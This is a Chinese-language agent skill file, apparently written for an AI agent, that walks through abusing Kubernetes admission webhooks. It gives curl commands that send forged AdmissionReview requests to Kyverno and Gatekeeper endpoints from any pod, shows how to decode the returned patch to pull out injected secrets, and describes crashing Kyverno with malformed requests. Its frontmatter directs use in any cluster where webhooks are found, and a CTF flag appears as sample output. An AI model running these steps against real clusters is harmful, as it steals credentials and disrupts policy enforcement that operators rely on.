---
name: k8s-webhook-abuse
description: "Kubernetes Admission Webhook 滥用与策略引擎利用。当集群存在 Kyverno/OPA Gatekeeper/自定义 Webhook、DNS 扫描发现 kyverno-svc 或 gatekeeper 服务、或需要从 Mutating Webhook 提取注入的 Secret 时使用。核心手法：伪造 AdmissionReview 请求。任何在 K8s 中发现 Webhook 服务或策略引擎的场景都应使用此技能"
metadata:
  tags: "k8s,kubernetes,webhook,kyverno,opa,gatekeeper,admission,mutate,validate,策略引擎,准入控制"
  category: "cloud"
---

# Kubernetes Admission Webhook 滥用

K8s 的 Admission Webhook 是集群安全的守门人，负责在资源创建/修改时执行策略（注入 Secret、环境变量等）。问题在于：很多 Webhook 不验证请求是否来自 API Server。这意味着攻击者可以从任意 Pod 直接向 Webhook 发送伪造的 AdmissionReview 请求，骗取本应注入到特权 Pod 中的 Secret。

```
正常流程:
  kubectl create pod → API Server → Mutating Webhook → (注入 secret) → 存储

攻击流程:
  攻击者 Pod → 直接 POST 到 Webhook → Webhook 返回 patch（含 secret）
```

---

## Phase 1: 发现 Webhook 服务

```bash
# DNS 扫描发现策略引擎
k8spider scan -subnet <service-cidr>

# 常见的 Webhook 服务名
# Kyverno:
#   kyverno-svc.kyverno.svc.cluster.local (443)
#   kyverno-cleanup-controller.kyverno.svc.cluster.local
# OPA Gatekeeper:
#   gatekeeper-webhook-service.gatekeeper-system.svc.cluster.local
# 自定义:
#   *-webhook-service.*

# 检测 Webhook 端点
curl -k https://kyverno-svc.kyverno.svc.cluster.local/mutate
# GET 请求返回 "only POST/OPTIONS supported" → 说明服务可达且未验证来源
```

---

## Phase 2: 构造 AdmissionReview 请求

构造一个假的 Pod 创建请求发给 Webhook，骗它返回 mutation patch。

完整 JSON payload 模板见 → [references/admission-review-template.md](references/admission-review-template.md)

关键字段说明：
- `namespace` — 必须匹配策略的 match 条件（如 `sensitive-ns`），否则 Webhook 不会触发 mutation
- `kind` / `requestKind` — 必须填写，缺失会导致 Kyverno panic
- `operation` — 通常用 `CREATE`
- `object.spec.containers` — 至少包含一个容器定义

### 发送请求

```bash
# 保存 JSON（从 references/admission-review-template.md 获取完整模板）
cat > /tmp/admission.json << 'EOF'
... 完整 JSON ...
EOF

# 发送到 Kyverno mutate 端点
curl -k -X POST \
  -H "Content-Type: application/json" \
  -d @/tmp/admission.json \
  https://kyverno-svc.kyverno.svc.cluster.local/mutate

# 注意事项（踩坑经验）:
# - 必须 HTTPS + -k（自签证书）
# - 必须 Content-Type: application/json
# - 不要加 --http1.1（Kyverno 需要 HTTP/2，否则 stream 断开）
# - namespace 必须匹配策略的 match 条件
```

---

## Phase 3: 解析返回的 Patch

响应中的 `response.patch` 是 Base64 编码的 JSONPatch：

```bash
# 从响应中提取 patch
echo '<patch-base64>' | base64 -d | jq .

# 输出示例:
# [{"op":"add","path":"/spec/containers/0/env","value":[{"name":"FLAG","value":"wiz_k8s_lan_party{...}"}]}]
```

---

## Phase 4: 其他 Webhook 攻击

### OPA Gatekeeper

端点和请求格式见 → [references/admission-review-template.md](references/admission-review-template.md)

### Kyverno 空指针 Panic（确认可利用性）

发送缺少 `requestKind`/`requestResource` 的不完整 AdmissionReview，Kyverno 会 panic（空指针解引用）。这虽然不直接有用，但能确认 Webhook 不验证调用方身份。

---

## 常见策略引擎端点

| 引擎 | 端点 | 端口 | 类型 |
|------|------|------|------|
| Kyverno | `/mutate`, `/validate` | 443 | Mutating + Validating |
| OPA Gatekeeper | `/v1/admit` | 443 | Validating |
| 自定义 | `/mutate`, `/validate`, `/webhook` | 443/8443 | 取决于实现 |

---

## 关键要点

- **Webhook 不验证来源 = 任何 Pod 都能伪造请求**
- Mutating Webhook 的返回 patch 可能包含注入的 Secret/Flag/Token
- `namespace` 字段必须匹配策略的 match 条件才能触发 mutation
- `requestKind` 和 `requestResource` 字段不能为空（否则 Kyverno 会 panic）
- 使用 HTTP/2（不要 `--http1.1`），且必须带 `Content-Type: application/json`
